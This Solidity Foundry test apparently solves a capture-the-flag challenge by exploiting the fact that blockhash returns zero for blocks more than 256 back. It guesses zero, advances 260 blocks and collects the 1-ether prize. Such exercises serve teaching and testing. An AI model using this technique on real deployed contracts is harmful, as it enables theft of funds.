// SPDX-License-Identifier: GPL-3.0-or-later

pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/PredictTheBlockHashChallenge.sol";

contract PredictTheBlockHashChallengeTest is Test {
    PredictTheBlockHashChallenge public predictTheBlockHashChallenge;
    address alice = address(0xf);

    function setUp() public {
        payable(alice).transfer(1 ether);

        predictTheBlockHashChallenge = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function testPredictTheBlockHash() public {
        uint256 beforeValue = alice.balance;
        emit log_named_uint("alice value", beforeValue);

        vm.startPrank(alice);
        predictTheBlockHashChallenge.lockInGuess{value: 1 ether}(bytes32(0));

        vm.roll(block.number + 260);

        predictTheBlockHashChallenge.settle();
        vm.stopPrank();

        uint256 laterValue = alice.balance;
        emit log_named_uint("alice value", laterValue);

        assertEq(beforeValue + 1 ether, laterValue);
        assertEq(predictTheBlockHashChallenge.isComplete(), true);
    }
}
